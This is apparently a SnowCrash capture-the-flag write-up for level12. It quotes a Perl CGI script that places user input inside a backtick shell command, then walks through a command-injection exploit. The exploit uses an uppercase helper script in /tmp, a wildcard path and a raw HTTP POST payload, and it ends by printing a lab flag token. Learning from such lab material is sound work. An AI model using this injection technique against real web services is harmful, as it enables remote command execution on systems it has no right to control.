In level12, we have a perl script that is a bit similar to the script in level04, namely a cgi script to which we might be able to send an html request.
The script is a bit more complex than in level04.

```perl
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/; 
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }    
}

n(t(param("x"), param("y")));
```


It accepts two params x and y.
It passes x and y as arguments to a subroutine (=function) t that:
converts x to uppercase, strips anything after the first whitespace
it will then look with the command egrep for the lines that begins with the content in x in the file /tmp/xd
for each line that match, it will then split each line on the first occurence of ':'
then if the second part of any of the line matches the regular expression in the variable y, it will return 1, else it will return 0
the result of this t function will be passed to a n function that prints '..' if the parameter is 1 and '.' if the parameter is 0.

Most likely, the program vulnerability is on the egrep line as it is the only point where the program interacts with the shell

in fact, if we have getflag in our /tmp/xd file and we type the following command, it launches the getflag command:
```bash
level12@SnowCrash:~$ `egrep "^getflag" /tmp/xd 2>&1`
Check flag.Here is your token : 
Nope there is no token here for you sorry. Try again :)
```
however, the issue is that the program set the text to upper case before processing it and GETFLAG won't work. We can work around this by setting a variable GETFLAG=getflag

```bash
level12@SnowCrash:~$ export GETFLAG=getflag
level12@SnowCrash:~$ `egrep "^$GETFLAG" /tmp/xd 2>&1`
Check flag.Here is your token : 
Nope there is no token here for you sorry. Try again :)
```

The issue is that the program doesn't run in the same shell instance, so the variable we created doesn't exist.
I also tried by writing this line in the /tmp/xd file /bin/getflag | wall (wall so that the message is sent to all instances of shell).
And passing '/' as x argument to my program, the idea being that egrep would match with the line as it starts by / and therefore thanks to the backticks would execute the command /bin/getflag | wall.

However, it is not working and it is due I think to the fact that the output of `/bin/getflag | wall` is captured in the output variable and not executed directly so we can't get the result as a message on the shell.

The solution would then be to be able to somehow replace the xx variable by `getflag | wall` (with backticks), so that it is executed within the command execution for the output variable.

We just need a workaround to inject it with uppercase and a solution is to have a file in UPPERCASE that is a script for getflag.

We create such a script in /tmp/SCRIPT
```bash
#!/bin/sh
getflag | wall
```

and in order to work around the fact that tmp is lowercase, we can use a wildcard and call the script like that /*/SCRIPT. We then give the execution right to our script chmod +x /tmp/SCRIPT

we can connect with telnet ```telnet localhost 4646``` and send the following request
POST /level12.pl HTTP/1.1
Host: localhost
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 13

x=`/*/SCRIPT`

```bash
level12@SnowCrash:~$ telnet localhost 4646
Trying 127.0.0.1...
Connected to localhost.
Escape character is '^]'.
POST /level12.pl HTTP/1.1
Host: localhost
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 13

x=`/*/SCRIPT`
                                                                               
Broadcast Message from flag12@Snow                                             
        (somewhere) at 11:51 ...                                               
                                                                               
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr                      
                                                                               
HTTP/1.1 200 OK
Date: Thu, 23 Nov 2023 10:51:43 GMT
Server: Apache/2.2.22 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 2
Connection: close
Content-Type: text/html

..Connection closed by foreign host.
```

and bingo we get our token
